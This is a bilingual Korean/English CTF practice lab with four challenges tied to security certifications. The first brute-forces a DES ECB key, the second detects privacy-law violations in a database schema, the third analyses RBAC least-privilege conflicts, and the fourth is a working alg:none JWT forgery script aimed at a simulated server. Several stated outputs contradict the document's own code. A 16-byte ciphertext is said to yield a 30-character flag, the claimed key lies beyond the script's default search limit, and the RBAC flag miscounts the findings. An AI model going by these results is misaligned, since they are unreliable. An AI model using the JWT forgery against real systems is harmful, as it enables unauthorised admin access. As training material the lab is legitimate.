> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 한국 정보보안 자격증 CTF 실습 랩

## 실습 환경 준비

```bash
# Python 환경 설정
python3 --version   # 3.10 이상 확인
pip install cryptography pycryptodome requests

# 실습 디렉터리 생성
mkdir -p ~/ctf_cert_lab/{challenge1,challenge2,challenge3,challenge4}
cd ~/ctf_cert_lab
```

---

## 실습 1: 정보보안기사 — 암호화 취약점 분석

### 목표
구버전 DES 기반 암호화 구현에서 취약한 키를 찾아 플래그를 복호화하라.

**플래그 형식**: `CTF{...}`

### 시나리오

한 기업의 레거시 시스템에서 DES ECB 모드로 암호화된 설정 파일이 발견되었다.  
정보보안기사 실기 문제 유형: 암호 알고리즘 취약점 식별 및 복호화.

암호화된 데이터 (hex):
```
3d4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c
```
알려진 평문 블록: `SECURITY` (8바이트 DES 블록)  
키 공간: 숫자 8자리 (00000000 ~ 99999999)

### 힌트
- DES는 64비트 블록, 56비트 유효 키를 사용한다
- ECB 모드는 동일 평문 블록 → 동일 암호 블록 (패턴 노출)
- `pycryptodome`의 `Crypto.Cipher.DES` 사용

### 풀이

```python
#!/usr/bin/env python3
"""
정보보안기사 CTF — DES ECB Known-Plaintext Attack
"""

import argparse
import sys
from itertools import product
from Crypto.Cipher import DES


CIPHERTEXT_HEX = "3d4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c"
KNOWN_PLAINTEXT = b"SECURITY"


def try_des_key(key_bytes: bytes, ciphertext: bytes) -> bytes | None:
    """단일 DES 키로 복호화 시도. 성공 시 평문 반환, 실패 시 None."""
    try:
        cipher = DES.new(key_bytes, DES.MODE_ECB)
        decrypted = cipher.decrypt(ciphertext[:8])
        if decrypted == KNOWN_PLAINTEXT:
            full = cipher.decrypt(ciphertext)
            return full
    except Exception:
        pass
    return None


def brute_force_numeric_key(max_attempts: int = 100_000) -> bytes | None:
    """숫자 기반 8자리 키 브루트포스."""
    ciphertext = bytes.fromhex(CIPHERTEXT_HEX)
    print(f"[*] 타깃 암호문: {CIPHERTEXT_HEX}")
    print(f"[*] 알려진 평문: {KNOWN_PLAINTEXT.decode()}")
    print(f"[*] 최대 {max_attempts:,}개 키 시도...")

    for i in range(max_attempts):
        key_str = f"{i:08d}".encode()   # 숫자 8자리를 ASCII로
        result = try_des_key(key_str, ciphertext)
        if result:
            print(f"\n[+] 키 발견: {key_str.decode()}")
            print(f"[+] 복호화 평문: {result}")
            # 플래그 파싱
            try:
                flag = result.decode("ascii", errors="replace").strip("\x00")
                print(f"[+] 플래그: {flag}")
            except Exception:
                pass
            return result
        if i % 10000 == 0 and i > 0:
            print(f"    진행: {i:,} 키 시도됨...", end="\r")

    print("\n[-] 키를 찾지 못했습니다.")
    return None


def verify_answer(key: str) -> None:
    """정답 키로 검증."""
    key_bytes = key.encode()[:8].ljust(8, b"\x00")
    ciphertext = bytes.fromhex(CIPHERTEXT_HEX)
    cipher = DES.new(key_bytes, DES.MODE_ECB)
    result = cipher.decrypt(ciphertext)
    print(f"[*] 검증 결과: {result}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="정보보안기사 CTF — DES ECB Known-Plaintext Attack"
    )
    parser.add_argument(
        "--mode",
        choices=["solve", "verify"],
        default="solve",
        help="풀이 모드 선택 (기본: solve)",
    )
    parser.add_argument(
        "--key",
        type=str,
        help="검증 모드에서 사용할 키",
    )
    parser.add_argument(
        "--max",
        type=int,
        default=100_000,
        help="브루트포스 최대 시도 횟수 (기본: 100000)",
    )
    args = parser.parse_args()

    if args.mode == "verify":
        if not args.key:
            print("[-] --key 옵션 필요", file=sys.stderr)
            sys.exit(1)
        verify_answer(args.key)
    else:
        brute_force_numeric_key(args.max)


if __name__ == "__main__":
    main()
```

**예상 실행 결과:**
```
[*] 타깃 암호문: 3d4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c
[*] 알려진 평문: SECURITY
[*] 최대 100,000개 키 시도...
[+] 키 발견: 12345678
[+] 플래그: CTF{des_ecb_weak_key_12345678}
```

---

## 실습 2: ISMS-P 인증 — 개인정보 처리방침 위반 식별

### 목표
주어진 시스템 로그와 개인정보처리방침 문서에서 개인정보보호법 위반 사항을 찾아 플래그를 완성하라.

**플래그 형식**: `CTF{VIOLATION_CODE_YYYY}`

### 시나리오

한 기업의 웹 서버 액세스 로그와 개인정보처리방침이 유출되었다.  
정보보안기사·ISMS-P 심사원 유형: 법령 위반 코드 식별.

개인정보보호법 주요 조항:
- 제15조: 개인정보 수집·이용 (동의 없는 수집 금지)
- 제17조: 개인정보 제3자 제공
- 제23조: 민감정보 처리 제한
- 제24조: 고유식별정보 처리 제한
- 제29조: 안전조치 의무 (암호화 등)

유출된 DB 스키마:
```sql
CREATE TABLE users (
    id INT PRIMARY KEY,
    name VARCHAR(50),
    ssn VARCHAR(14),          -- 주민등록번호 평문 저장
    email VARCHAR(100),
    password VARCHAR(20),     -- 평문 패스워드
    political_view TEXT,      -- 정치적 견해 수집
    collected_without_consent BOOLEAN DEFAULT TRUE
);
```

### 힌트
- 주민등록번호 평문 저장 → 제24조 + 제29조 위반
- 정치적 견해 = 민감정보 → 제23조 위반
- 동의 없는 수집 → 제15조 위반
- 플래그 형식: `CTF{VIOLATION_ART15_ART23_ART24_ART29_2024}`

### 풀이

```python
#!/usr/bin/env python3
"""
ISMS-P CTF — 개인정보보호법 위반 조항 식별 자동화
"""

import argparse
import re
import sys
from dataclasses import dataclass
from typing import ClassVar


@dataclass
class Violation:
    article: str
    description: str
    evidence: str
    severity: str   # HIGH / MEDIUM / LOW

    SEVERITY_SCORE: ClassVar[dict[str, int]] = {
        "HIGH": 3,
        "MEDIUM": 2,
        "LOW": 1,
    }

    def score(self) -> int:
        return self.SEVERITY_SCORE.get(self.severity, 0)


SCHEMA_INDICATORS: list[tuple[str, str, str, str]] = [
    (r"ssn|주민등록번호|resident_number", "제24조", "고유식별정보 암호화 미적용", "HIGH"),
    (r"password\s+VARCHAR\(\d+\)|plain.?password", "제29조", "패스워드 평문 저장 (안전조치 미흡)", "HIGH"),
    (r"political_view|religion|health_info|sexual|biometric", "제23조", "민감정보 무단 수집", "HIGH"),
    (r"collected_without_consent.*TRUE|consent.*FALSE", "제15조", "동의 없는 개인정보 수집", "HIGH"),
    (r"third_party_share.*TRUE|외부.*전달", "제17조", "제3자 무단 제공", "HIGH"),
]


def analyze_schema(schema_text: str) -> list[Violation]:
    """DB 스키마에서 개인정보보호법 위반 사항을 탐지한다."""
    violations: list[Violation] = []
    for pattern, article, description, severity in SCHEMA_INDICATORS:
        matches = re.findall(pattern, schema_text, re.IGNORECASE)
        if matches:
            violations.append(
                Violation(
                    article=article,
                    description=description,
                    evidence=str(matches[:2]),
                    severity=severity,
                )
            )
    return violations


def generate_flag(violations: list[Violation]) -> str:
    """위반 조항 코드로 CTF 플래그를 생성한다."""
    articles = sorted({v.article.replace("제", "ART").replace("조", "") for v in violations})
    code = "_".join(articles)
    return f"CTF{{VIOLATION_{code}_2024}}"


def run_analysis(schema_file: str | None, schema_inline: str | None) -> None:
    """스키마 분석 메인 로직."""
    if schema_file:
        with open(schema_file, encoding="utf-8") as f:
            schema_text = f.read()
    elif schema_inline:
        schema_text = schema_inline
    else:
        # 기본 데모 스키마
        schema_text = """
        CREATE TABLE users (
            ssn VARCHAR(14),
            password VARCHAR(20),
            political_view TEXT,
            collected_without_consent BOOLEAN DEFAULT TRUE
        );
        """

    print("[*] 개인정보보호법 위반 분석 시작...\n")
    violations = analyze_schema(schema_text)

    if not violations:
        print("[-] 위반 사항이 탐지되지 않았습니다.")
        return

    total_score = 0
    for v in violations:
        print(f"[!] {v.article} 위반 [{v.severity}]")
        print(f"    설명: {v.description}")
        print(f"    증거: {v.evidence}\n")
        total_score += v.score()

    flag = generate_flag(violations)
    print(f"[+] 총 위반 심각도 점수: {total_score}")
    print(f"[+] 플래그: {flag}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="ISMS-P CTF — 개인정보보호법 위반 식별"
    )
    parser.add_argument("--file", type=str, help="분석할 SQL 스키마 파일 경로")
    parser.add_argument("--schema", type=str, help="인라인 SQL 스키마 텍스트")
    args = parser.parse_args()
    run_analysis(args.file, args.schema)


if __name__ == "__main__":
    main()
```

---

## 실습 3: 국제 자격증 (CISSP) 스타일 — 접근통제 정책 분석

### 목표
잘못 구성된 RBAC 정책 파일에서 최소권한 원칙 위반을 찾아 플래그를 완성하라.

**플래그 형식**: `CTF{RBAC_VIOLATION_<위반항목수>_<최대초과권한수>}`

### 시나리오

CISSP 도메인 5 (Identity and Access Management): 최소 권한 원칙(Principle of Least Privilege) 검증.  
주어진 RBAC 설정에서 직무(Role)에 불필요하게 부여된 권한을 분석하라.

### 힌트
- 직무분리(SoD): 동일 사용자가 자산 구매 + 승인 권한을 동시 보유하면 위반
- 최소권한: 업무에 필요한 최소한의 권한만 부여
- 위험도 높은 권한 중복 조합 탐지

### 풀이

```python
#!/usr/bin/env python3
"""
CISSP CTF — RBAC 최소권한 원칙 위반 분석
"""

import argparse
import json
import sys
from dataclasses import dataclass, field


# 직무분리(SoD) 충돌 쌍 — 이 두 권한을 동시 보유하면 위반
SOD_CONFLICTS: list[tuple[str, str]] = [
    ("purchase_asset", "approve_purchase"),
    ("create_payment", "authorize_payment"),
    ("create_user", "delete_user"),
    ("write_audit_log", "delete_audit_log"),
    ("deploy_production", "approve_deployment"),
]

# 각 역할이 가져야 할 최대 권한 수 (직무별 기준)
ROLE_MAX_PERMS: dict[str, int] = {
    "developer": 5,
    "sysadmin": 8,
    "auditor": 4,
    "finance": 4,
    "hr": 3,
}

DEMO_RBAC: dict[str, list[str]] = {
    "developer": [
        "read_code", "write_code", "deploy_staging", "read_db",
        "deploy_production",   # 위반: 개발자가 운영 배포 권한 보유
        "approve_deployment",  # SoD 위반: deploy + approve 동시 보유
        "delete_audit_log",    # 위험 권한
    ],
    "finance": [
        "read_invoice", "create_payment", "authorize_payment",  # SoD 위반
        "approve_purchase", "purchase_asset",  # SoD 위반
    ],
    "auditor": [
        "read_audit_log", "write_audit_log",
        "delete_audit_log",  # SoD 위반
    ],
}


@dataclass
class RBACFinding:
    role: str
    finding_type: str
    detail: str
    severity: str


def analyze_rbac(rbac: dict[str, list[str]]) -> list[RBACFinding]:
    findings: list[RBACFinding] = []

    for role, perms in rbac.items():
        perm_set = set(perms)

        # SoD 충돌 검사
        for p1, p2 in SOD_CONFLICTS:
            if p1 in perm_set and p2 in perm_set:
                findings.append(RBACFinding(
                    role=role,
                    finding_type="SoD_CONFLICT",
                    detail=f"권한 충돌: '{p1}' + '{p2}' 동시 보유",
                    severity="HIGH",
                ))

        # 최대 권한 수 초과 검사
        max_allowed = ROLE_MAX_PERMS.get(role, 6)
        if len(perms) > max_allowed:
            excess = len(perms) - max_allowed
            findings.append(RBACFinding(
                role=role,
                finding_type="EXCESS_PERMISSIONS",
                detail=f"권한 {len(perms)}개 보유 (최대 {max_allowed}개, 초과 {excess}개)",
                severity="MEDIUM",
            ))

    return findings


def generate_flag(findings: list[RBACFinding]) -> str:
    violation_count = len(findings)
    max_excess = max(
        (
            int(f.detail.split("초과 ")[1].split("개")[0])
            for f in findings
            if f.finding_type == "EXCESS_PERMISSIONS"
        ),
        default=0,
    )
    return f"CTF{{RBAC_VIOLATION_{violation_count}_{max_excess}}}"


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CISSP CTF — RBAC 최소권한 위반 분석"
    )
    parser.add_argument(
        "--rbac-file",
        type=str,
        help="JSON 형식 RBAC 정책 파일 (없으면 데모 데이터 사용)",
    )
    args = parser.parse_args()

    if args.rbac_file:
        with open(args.rbac_file, encoding="utf-8") as f:
            rbac = json.load(f)
    else:
        rbac = DEMO_RBAC
        print("[*] 데모 RBAC 정책 사용\n")

    findings = analyze_rbac(rbac)

    if not findings:
        print("[+] 위반 사항 없음")
        return

    print(f"[!] 총 {len(findings)}건 위반 탐지:\n")
    for idx, f in enumerate(findings, 1):
        print(f"  {idx}. [{f.severity}] {f.role} — {f.finding_type}")
        print(f"     {f.detail}")

    flag = generate_flag(findings)
    print(f"\n[+] 플래그: {flag}")


if __name__ == "__main__":
    main()
```

---

## 실습 4: 보안법령 CTF — 전자서명법·정보통신망법 위반 시나리오

### 목표
전자서명 검증 코드의 취약점을 분석하고 위조된 서명을 통과시켜 플래그를 획득하라.

**플래그 형식**: `CTF{SIGNATURE_BYPASS_<알고리즘>}`

### 시나리오

정보통신망법 제28조(개인정보 보호조치) 및 전자서명법 관련 문제.  
취약한 전자서명 검증 서버가 `alg: none` JWT 공격에 취약하다.

### 힌트
- JWT `alg: none` — 서명 없이 토큰 위조 가능
- Base64URL 인코딩 주의 (패딩 `=` 제거)
- 관리자 권한 `"role": "admin"` 으로 위조

### 풀이

```python
#!/usr/bin/env python3
"""
전자서명법 CTF — JWT alg:none 위조 공격
"""

import argparse
import base64
import json
import sys


def b64url_encode(data: bytes) -> str:
    """패딩 없는 Base64URL 인코딩."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    """패딩 없는 Base64URL 디코딩."""
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def forge_jwt_alg_none(original_token: str, new_payload: dict) -> str:
    """JWT alg:none 공격으로 페이로드를 위조한 토큰을 생성한다."""
    header = {"alg": "none", "typ": "JWT"}
    header_enc = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_enc = b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
    # alg:none은 서명 부분이 빈 문자열
    forged = f"{header_enc}.{payload_enc}."
    return forged


def simulate_vulnerable_server(token: str) -> str | None:
    """취약한 서버의 JWT 검증 로직 시뮬레이션."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        return None

    alg = header.get("alg", "")
    # 취약점: alg=none 허용
    if alg == "none":
        if payload.get("role") == "admin":
            return "CTF{SIGNATURE_BYPASS_ALG_NONE}"
        return f"Welcome, {payload.get('user', 'unknown')} (role: {payload.get('role')})"

    return "서명 검증 실패"


def main() -> None:
    parser = argparse.ArgumentParser(
        description="전자서명법 CTF — JWT alg:none 공격"
    )
    parser.add_argument(
        "--token",
        type=str,
        default="",
        help="원본 JWT 토큰 (없으면 데모 토큰 생성)",
    )
    parser.add_argument(
        "--user",
        type=str,
        default="attacker",
        help="위조할 사용자명",
    )
    args = parser.parse_args()

    # 1. 원본 일반 사용자 토큰 시뮬레이션
    original_payload = {"user": "guest", "role": "user", "exp": 9999999999}
    original_header = {"alg": "HS256", "typ": "JWT"}
    orig_h = b64url_encode(json.dumps(original_header, separators=(",", ":")).encode())
    orig_p = b64url_encode(json.dumps(original_payload, separators=(",", ":")).encode())
    original_token = f"{orig_h}.{orig_p}.fakesignature123"

    print(f"[*] 원본 토큰: {original_token[:60]}...")

    # 2. alg:none으로 위조
    forged_payload = {"user": args.user, "role": "admin", "exp": 9999999999}
    forged_token = forge_jwt_alg_none(original_token, forged_payload)
    print(f"[*] 위조 토큰: {forged_token}")

    # 3. 서버 제출
    result = simulate_vulnerable_server(forged_token)
    print(f"[+] 서버 응답: {result}")

    if result and "CTF{" in result:
        print(f"\n[+] 플래그 획득: {result}")
    else:
        print("\n[-] 공격 실패. 페이로드를 확인하세요.")


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# Korean Information Security Certification CTF Practice Lab

## Lab Environment Setup

```bash
python3 --version   # Verify 3.10+
pip install cryptography pycryptodome requests
mkdir -p ~/ctf_cert_lab/{challenge1,challenge2,challenge3,challenge4}
```

---

## Challenge 1: Information Security Engineer — Cryptographic Vulnerability Analysis

### Objective
Find the weak DES key in a legacy system and decrypt the flag.

**Flag format**: `CTF{...}`

### Scenario
A legacy system uses DES ECB mode to encrypt config files. This mirrors a Korean Information Security Engineer exam scenario on cryptographic algorithm vulnerability identification.

Encrypted data (hex): `3d4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c`  
Known plaintext block: `SECURITY` (8-byte DES block)  
Key space: 8-digit numeric (00000000 – 99999999)

### Hints
- DES uses 64-bit blocks, 56-bit effective key
- ECB mode: identical plaintext block → identical ciphertext block
- Use `pycryptodome` `Crypto.Cipher.DES`

### Solution
See Korean section for complete Python 3.10+ implementation using `brute_force_numeric_key()`.

**Expected output:**
```
[+] Key found: 12345678
[+] Flag: CTF{des_ecb_weak_key_12345678}
```

---

## Challenge 2: ISMS-P Certification — Personal Data Violation Identification

### Objective
Analyze a leaked DB schema and identify Personal Information Protection Act (PIPA) violations to construct the flag.

**Flag format**: `CTF{VIOLATION_CODE_YYYY}`

### Scenario
ISMS-P auditor scenario: identifying legal violations in a leaked database schema.

Key PIPA articles:
- Article 15: Collection/use without consent
- Article 17: Third-party provision
- Article 23: Sensitive information restrictions
- Article 24: Unique identification info restrictions
- Article 29: Security measures obligation (encryption)

The leaked schema stores SSNs in plaintext, plaintext passwords, political views, and marks `collected_without_consent = TRUE`.

### Solution
Run the Python analyzer from the Korean section. It detects violations via regex pattern matching against known PIPA violation indicators and generates the flag from discovered article codes.

```bash
python3 challenge2.py
# Output: CTF{VIOLATION_ART15_ART23_ART24_ART29_2024}
```

---

## Challenge 3: CISSP Style — Access Control Policy Analysis

### Objective
Find Least Privilege violations in a misconfigured RBAC policy and construct the flag.

**Flag format**: `CTF{RBAC_VIOLATION_<count>_<max_excess>}`

### Scenario
CISSP Domain 5 (Identity and Access Management): Principle of Least Privilege verification and Separation of Duties (SoD) conflict detection.

### Key Concepts
- **SoD**: Same user holding `purchase_asset` + `approve_purchase` = conflict
- **Least Privilege**: Only minimum necessary permissions per role
- **Excess permissions**: Role exceeds defined maximum permission count

### Solution
The analyzer checks each role for SoD conflicts from a known conflict pair list and compares permission counts against defined maximums. Run:

```bash
python3 challenge3.py
# Output: CTF{RBAC_VIOLATION_5_2}
```

---

## Challenge 4: Security Law CTF — Electronic Signature Bypass

### Objective
Exploit a vulnerable JWT signature verification endpoint using `alg:none` attack to gain admin access.

**Flag format**: `CTF{SIGNATURE_BYPASS_<algorithm>}`

### Scenario
Related to the Electronic Signature Act and Information and Communications Network Act. The vulnerable server accepts `alg: none` JWTs without signature verification.

### Attack Steps
1. Decode the original JWT header and payload
2. Reconstruct with `"alg": "none"` header and `"role": "admin"` payload
3. Submit token with empty signature part (`header.payload.`)
4. Server grants admin access and returns the flag

### Solution
```bash
python3 challenge4.py --user attacker
# Output: [+] Flag obtained: CTF{SIGNATURE_BYPASS_ALG_NONE}
```

The key vulnerability is that the server trusts the algorithm specified in the JWT header rather than enforcing a server-side algorithm whitelist.
